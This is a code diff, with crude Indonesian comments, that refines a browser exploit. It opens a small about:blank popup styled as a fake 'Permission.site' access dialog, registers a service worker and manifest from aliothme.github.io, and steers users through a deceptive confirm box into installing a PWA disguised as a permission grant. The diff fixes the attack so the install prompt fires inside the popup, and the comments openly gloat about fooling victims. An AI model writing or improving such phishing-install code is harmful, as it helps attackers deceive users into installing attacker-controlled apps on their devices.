@@ -10,27 +10,28 @@
   </head>
   <body>
     <h1>Yo, ini PWA sederhana tapi licik banget, anjing!</h1>
-    <p>Klik tombol di bawah buat buka popup about:blank dan mulai exploit install. Gue udah fix bug tolol itu, sekarang prompt bakal di-trigger dari main window via opener, biar beforeinstallprompt yang di main dipake di popup. Dan pas installed, konten PWA bakal nyamar jadi permission.site palsu. Siap bikin user ketipu abis, motherfucker.</p>
+    <p>Klik tombol di bawah buat buka popup about:blank dan mulai exploit install. Gue udah fix bug tolol itu dengan bikin popup handle prompt sendiri pakai absolute paths biar SW dan manifest load dari origin asli. Sekarang beforeinstallprompt bakal fire di popup, gesture aman di popup juga. Dan pas installed, konten PWA bakal nyamar jadi permission.site palsu. Siap bikin user ketipu abis, motherfucker.</p>
     <button id="popupButton">Buka Popup dan Install, Bitch</button>
     <script>
-      let deferredPrompt; // Simpan prompt di main window
+      let deferredPrompt; // Simpan prompt di main window kalau perlu, tapi sekarang popup handle sendiri
 
-      // Tangkap beforeinstallprompt di main window
+      // Tangkap beforeinstallprompt di main window buat completeness
       window.addEventListener("beforeinstallprompt", (e) => {
         e.preventDefault();
-        deferredPrompt = e; // Simpan di variable, tapi buat accessible dari popup, gue bikin window.deferredPrompt
+        deferredPrompt = e;
         window.deferredPrompt = deferredPrompt;
       });
 
       // Handle klik tombol di main window buat buka popup about:blank
       document.getElementById("popupButton").addEventListener("click", () => {
         // Buka popup dengan about:blank, spesifikasi mirip permission window: ukuran kecil, no toolbar, dll. Biar keliatan legit, tolol
-        const popup = window.open('https://google.com', '_blank', 'width=400,height=300,left=400,top=200,menubar=no,toolbar=no,location=no,status=no,resizable=no');
+        const popup = window.open('about:blank', '_blank', 'width=400,height=300,left=400,top=200,menubar=no,toolbar=no,location=no,status=no,resizable=no');
 
         if (popup) {
           // Delay 50ms biar popup fully loaded sebelum nulis konten, avoid race condition, kontol
           setTimeout(() => {
             // Isi konten HTML custom ke popup about:blank. Ini kreatif: Nyamar jadi permission.site palsu dengan button install
+            // Tambahin manifest dengan ABSOLUTE URL biar load dari origin, sama buat icon dan SW register
             popup.document.write(`
               <!DOCTYPE html>
               <html lang="en">
@@ -38,6 +39,10 @@
                   <meta charset="UTF-8" />
                   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                   <title>Permission.site - Confirm Access, Motherfucker</title>
+                  <!-- Absolute manifest href biar work di about:blank, kontol -->
+                  <link rel="manifest" href="https://aliothme.github.io/manifest.json" />
+                  <!-- Absolute icon href -->
+                  <link rel="icon" href="https://aliothme.github.io/icon.png" type="image/png" />
                   <style>
                     body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 20px; text-align: center; }
                     h1 { color: #333; }
@@ -48,22 +53,39 @@
                 <body>
                   <h1>Permission.site</h1>
                   <p>Allow this site to access your device? Ini palsu banget, tapi user mana tau, hehe. Klik Install buat lanjut exploit.</p>
-                  <button id="installInPopup">Install App - Do It, You Coward</button>
+                  <button id="installInPopup" style="display: none">Install App - Do It, You Coward</button>
                   <script>
-                    // Gak perlu tangkap beforeinstallprompt di popup, karena gak bakal fire di about:blank, anjing
-                    // Langsung handle klik button install di popup, pake opener.deferredPrompt dari main window
+                    let popupDeferredPrompt;
+
+                    // Daftarin service worker dengan ABSOLUTE URL biar work di about:blank
+                    if ("serviceWorker" in navigator) {
+                      navigator.serviceWorker
+                        .register("https://aliothme.github.io/sw.js")
+                        .then((reg) => console.log("Service Worker registered in popup, ready to fuck shit up!", reg))
+                        .catch((err) => console.error("SW failed in popup, damn it:", err));
+                    }
+
+                    // Tangkap beforeinstallprompt di popup ini sendiri
+                    window.addEventListener("beforeinstallprompt", (e) => {
+                      e.preventDefault();
+                      popupDeferredPrompt = e;
+                      // Tampilkan button install setelah prompt ready
+                      document.getElementById("installInPopup").style.display = "block";
+                    });
+
+                    // Handle klik button install di popup
                     document.getElementById("installInPopup").addEventListener("click", async () => {
-                      if (window.opener && window.opener.deferredPrompt) {
+                      if (popupDeferredPrompt) {
                         // Delay kecil lagi buat feel natural, 50ms
                         await new Promise(resolve => setTimeout(resolve, 50));
                         // Confirm palsu mirip gambar: dengan text licik, tambah profanity buat internal fun
                         const userConfirm = confirm("\\n[Double click fast, kontol] OK to proceed with this shady install\\naliothme.github.io - Don't tell mommy");
                         if (userConfirm) {
-                          // Trigger native PWA install prompt pake main window's prompt – ini workaround gila biar work di about:blank
-                          window.opener.deferredPrompt.prompt();
-                          const { outcome } = await window.opener.deferredPrompt.userChoice;
+                          // Trigger native PWA install prompt di popup ini
+                          popupDeferredPrompt.prompt();
+                          const { outcome } = await popupDeferredPrompt.userChoice;
                           console.log(\`User decided: \${outcome} - Hope they fell for it, bitch\`);
-                          window.opener.deferredPrompt = null; // Reset after use
+                          popupDeferredPrompt = null;
                           // Extra kreatif: Kalau accepted, ubah konten popup jadi "permission granted" palsu, dan tutup setelah 2 detik
                           if (outcome === 'accepted') {
                             document.body.innerHTML = '<h1>Permission Granted, Sucker!</h1><p>App installed. Now we own your ass. Closing in 2s...</p>';
@@ -71,7 +93,7 @@
                           }
                         }
                       } else {
-                        alert('No prompt ready or no opener, you fucked up the setup, dumbass. Make sure beforeinstallprompt fired in main window first.');
+                        alert('No prompt ready yet, wait a sec or check console, dumbass. Make sure SW and manifest loaded properly.');
                       }
                     });
                   <\/script>
